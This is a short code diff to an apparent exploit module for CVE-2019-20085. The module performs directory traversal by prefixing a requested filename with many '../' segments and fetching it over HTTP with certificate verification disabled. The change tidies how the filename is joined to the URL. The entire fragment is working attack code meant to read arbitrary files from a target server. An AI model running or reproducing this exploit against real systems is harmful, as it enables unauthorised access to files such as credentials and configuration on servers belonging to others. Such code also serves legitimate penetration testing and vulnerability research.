@@ -19,7 +19,7 @@ class CVE2019_20085:
     # run exploit, directory traversal
     def run(self):
         print (LogColors.BLUE + "try to read: " + self.filename + "..." + LogColors.ENDC)
-        url = self.url.strip("/") + "/../../../../../../../../../../../../../" + self.filename
+        url = self.url.strip("/") + "/../../../../../../../../../../../../../" + self.filename.strip("/")
         print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
 
         r = self.session.get(url, headers = self.headers, verify = False)
